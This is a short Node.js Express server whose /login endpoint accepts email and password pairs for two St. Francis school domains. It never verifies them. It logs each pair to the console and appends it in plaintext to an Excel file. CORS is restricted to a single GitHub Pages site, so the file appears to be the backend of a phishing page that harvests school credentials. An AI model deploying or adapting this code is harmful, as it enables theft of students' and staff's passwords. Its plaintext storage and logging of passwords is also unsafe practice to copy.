const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const XLSX = require('xlsx');
const cors = require('cors');
const path = require('path');

const app = express();

const corsOptions = {
  origin: 'https://franzzz2.github.io', // Restrict access to GitHub Pages domain
  optionsSuccessStatus: 200,
};
app.use(cors(corsOptions));
app.use(bodyParser.json());

let activeSessions = {};
const filePath = path.join(__dirname, 'logins.xlsx');

app.post('/login', (req, res) => {
  const { email, password } = req.body;

  if (!email.endsWith('@stfrancis.ph.education') && !email.endsWith('@stfrancis.edu.com')) {
    return res.json({ status: 'error', message: 'Invalid email. Please use your @stfrancis.ph.education or @stfrancis.edu.com email.' });
  }

  if (activeSessions[email]) {
    return res.json({ status: 'already_logged_in', message: 'User already logged in.' });
  }

  console.log("Saving login data:", { email, password });
  activeSessions[email] = true;

  let workbook;
  try {
    workbook = XLSX.readFile(filePath);
  } catch (err) {
    console.error("Error reading file:", err);
    workbook = XLSX.utils.book_new();
  }

  const sheetName = 'Logins';
  let worksheet = workbook.Sheets[sheetName];
  if (!worksheet) {
    worksheet = XLSX.utils.aoa_to_sheet([["Email", "Password", "Timestamp"]]);
    XLSX.utils.book_append_sheet(workbook, worksheet, sheetName);
  }

  const timestamp = new Date().toISOString();
  const newRow = [email, password, timestamp];
  XLSX.utils.sheet_add_aoa(worksheet, [newRow], { origin: -1 });

  try {
    XLSX.writeFile(workbook, filePath);
    res.json({ status: 'success', message: 'Login data saved successfully.' });
  } catch (err) {
    console.error("Error writing file:", err);
    res.json({ status: 'error', message: 'Error saving login data' });
  }
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
